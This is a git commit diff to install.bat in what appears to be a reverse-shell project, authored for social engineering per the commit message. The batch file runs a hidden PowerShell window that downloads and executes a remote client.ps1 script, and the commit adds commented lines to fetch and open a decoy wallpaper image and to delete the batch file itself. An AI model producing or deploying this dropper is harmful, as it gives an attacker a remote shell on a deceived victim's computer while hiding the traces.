c66d21e53ad933652cf27522144aadfa4c97c72a
Kevin LOCATI <kevin.locati@gmail.com>
2015-04-13 01:30:07 +0200

    Added image download and auto-removal in batch for SE

--- install.bat
+++ install.bat
@@ -1,2 +1,6 @@
+@echo off
 set scriptURL=https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1
+rem powershell -c "Invoke-WebRequest http://www.picturesnew.com/media/images/picture-wallpaper.jpg -OutFile ./pic.jpg"
+rem pic.jpg
 powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString('%scriptURL%')"
+rem del "%~f0"
